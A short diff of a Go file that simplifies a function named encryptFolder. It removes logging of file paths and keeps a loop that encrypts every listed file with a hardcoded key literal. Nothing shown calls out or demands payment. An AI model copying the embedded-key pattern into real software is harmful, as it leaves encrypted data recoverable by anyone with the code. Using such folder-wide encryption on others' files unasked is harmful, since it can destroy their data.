@@ -4,15 +4,8 @@ import (
 	"log"
 )
 
-func encryptFolder(files []string) {
-	for _, path := range files {
-		log.Println(path)
-	}
-	
-	
+func encryptFolder(files []string) {	
 	key := []byte("dj1f5GMFlyp]x,f.git1`58fiSldtf,v")
-	
-	
 	for _, filename := range files {
 		encrypt(filename, key)
 	}
